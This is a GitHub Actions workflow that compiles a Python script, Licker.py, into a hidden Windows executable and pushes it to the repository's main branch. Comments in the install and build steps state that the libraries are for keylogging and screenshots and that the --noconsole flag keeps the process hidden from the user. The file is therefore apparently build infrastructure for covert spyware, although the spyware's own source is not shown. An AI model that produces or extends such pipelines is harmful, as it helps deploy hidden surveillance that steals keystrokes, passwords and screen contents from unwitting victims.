name: Build and Sync Executable

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: windows-latest
    permissions:
      contents: write

    steps:
    - name: Checkout code
      uses: actions/checkout@v4
      with:
        fetch-depth: 0

    - name: Set up Python
      uses: actions/setup-python@v5
      with:
        python-version: '3.10'

    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
        # Essential libraries for keylogging and screenshots
        pip install pyinstaller keyboard pyscreenshot Pillow

    - name: Build Executable
      # --noconsole keeps the process hidden from the user
      run: pyinstaller --onefile --noconsole Licker.py

    - name: Sync EXE to Repo
      # Moving the EXE from the dist folder to the root before pushing
      run: |
        copy dist\Licker.exe Licker.exe
        git config --global user.name "github-actions[bot]"
        git config --global user.email "github-actions[bot]@users.noreply.github.com"
        git pull origin main --rebase
        git add Licker.exe
        git commit -m "Auto-build: Update Licker.exe" || exit 0
        git push origin main
